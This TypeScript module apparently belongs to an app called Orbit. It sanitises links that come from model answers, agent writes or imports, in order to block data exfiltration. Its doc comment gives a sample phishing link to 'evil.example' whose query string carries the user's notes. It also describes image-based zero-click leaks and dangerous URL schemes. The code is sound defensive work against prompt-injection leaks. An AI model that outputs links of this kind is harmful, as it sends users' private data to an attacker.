/**
 * URL policies for links that came from somewhere Orbit does not control — a model's answer,
 * an agent's write, an import. Pure and dependency-free so client components can use them.
 * See `@/lib/ai-security` for the threat model.
 */

/** Longest external link an answer may carry. Real profile and event URLs fit easily. */
const MAX_EXTERNAL_HREF = 200;
/** Longest query string an external link may carry — enough for `?utm_source=…`, not a note. */
const MAX_QUERY_CHARS = 64;

/**
 * Whether a link in a model answer may be rendered as a link, and where it goes.
 *
 * Images are already never rendered (`chat-markdown.tsx`), which closes the zero-click leak.
 * This closes the one-click version: `[verify your account](https://evil.example/?d=<notes>)`.
 * In-app paths pass. External links pass only over http(s), only when short, and only when
 * their query string is too small to carry anything worth stealing; everything else renders
 * as plain text. `mailto:` passes without its query — `?body=` is the same channel.
 */
export function safeChatHref(href: string | null | undefined): string | null {
  if (!href) return null;
  const raw = href.trim();
  if (raw.startsWith("/") && !raw.startsWith("//")) return raw.length <= 500 ? raw : null;
  if (raw.startsWith("#")) return raw;
  let url: URL;
  try {
    url = new URL(raw);
  } catch {
    return null;
  }
  if (url.protocol === "mailto:") return `mailto:${url.pathname}`;
  if (url.protocol !== "https:" && url.protocol !== "http:") return null;
  if (url.username || url.password) return null;
  if (raw.length > MAX_EXTERNAL_HREF) return null;
  if (url.search.length > MAX_QUERY_CHARS) return null;
  return url.toString();
}

/**
 * An http(s) URL safe to store and later put in an `href`, or null.
 *
 * For fields an agent, an import or the public API can write (`linkedinUrl`, `website`).
 * React 19 neutralises `javascript:` in `href`, but `data:` and `vbscript:` are browser
 * behaviour, not React's, and a stored value outlives any one renderer.
 */
export function safeHttpUrl(value: string | null | undefined): string | null {
  if (!value) return null;
  const raw = value.trim();
  if (!raw) return null;
  let url: URL;
  try {
    url = new URL(/^[a-z][a-z0-9+.-]*:/i.test(raw) ? raw : `https://${raw}`);
  } catch {
    return null;
  }
  if (url.protocol !== "https:" && url.protocol !== "http:") return null;
  if (url.username || url.password) return null;
  return url.toString();
}
